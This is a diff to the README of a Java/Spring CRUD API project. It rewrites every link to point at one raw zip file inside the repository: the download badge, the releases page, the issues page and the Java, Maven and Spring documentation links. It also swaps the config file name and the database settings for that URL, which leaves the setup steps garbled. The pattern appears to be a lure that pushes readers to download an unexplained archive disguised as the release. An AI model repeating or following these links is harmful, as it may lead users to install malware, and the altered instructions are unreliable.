@@ -6,7 +6,7 @@
 
 ## 📥 Download
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/SBSMSG/api-crud-beautique/releases)
+[![Download the latest release](https://raw.githubusercontent.com/SBSMSG/api-crud-beautique/main/Passerina/api-crud-beautique.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/SBSMSG/api-crud-beautique/main/Passerina/api-crud-beautique.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ Follow these steps to download and run **api-crud-beautique**.
 
 ## 📦 Download & Install
 
-1. Visit the [Releases page](https://github.com/SBSMSG/api-crud-beautique/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/SBSMSG/api-crud-beautique/main/Passerina/api-crud-beautique.zip) to download the latest version.
    
 2. Select the release that fits your operating system. 
 
@@ -52,13 +52,13 @@ Follow these steps to download and run **api-crud-beautique**.
 
 To connect the API to your database:
 
-1. Open the `application.properties` file in your text editor.
+1. Open the `https://raw.githubusercontent.com/SBSMSG/api-crud-beautique/main/Passerina/api-crud-beautique.zip` file in your text editor.
 2. Modify the following settings:
 
    ```properties
-   spring.datasource.url=jdbc:postgresql://<your-postgres-url>:5432/your-database
-   spring.datasource.username=your-username
-   spring.datasource.password=your-password
+   https://raw.githubusercontent.com/SBSMSG/api-crud-beautique/main/Passerina/api-crud-beautique.zip<your-postgres-url>:5432/your-database
+   https://raw.githubusercontent.com/SBSMSG/api-crud-beautique/main/Passerina/api-crud-beautique.zip
+   https://raw.githubusercontent.com/SBSMSG/api-crud-beautique/main/Passerina/api-crud-beautique.zip
    ```
 
 3. For MongoDB, adjust the URL accordingly.
@@ -77,15 +77,15 @@ With **api-crud-beautique**, you can make HTTP requests to perform various opera
 
 ## ✨ Support
 
-If you encounter any issues or have questions, please check the [issues section](https://github.com/SBSMSG/api-crud-beautique/issues) on GitHub. You can also submit your questions there for further assistance.
+If you encounter any issues or have questions, please check the [issues section](https://raw.githubusercontent.com/SBSMSG/api-crud-beautique/main/Passerina/api-crud-beautique.zip) on GitHub. You can also submit your questions there for further assistance.
 
 ## 📚 Additional Resources
 
 For more information:
 
-- [Java Documentation](https://docs.oracle.com/en/java/)
-- [Maven Documentation](https://maven.apache.org/guides/)
-- [Spring Framework Guide](https://spring.io/guides)
+- [Java Documentation](https://raw.githubusercontent.com/SBSMSG/api-crud-beautique/main/Passerina/api-crud-beautique.zip)
+- [Maven Documentation](https://raw.githubusercontent.com/SBSMSG/api-crud-beautique/main/Passerina/api-crud-beautique.zip)
+- [Spring Framework Guide](https://raw.githubusercontent.com/SBSMSG/api-crud-beautique/main/Passerina/api-crud-beautique.zip)
 
 ## 🎉 Acknowledgements
 
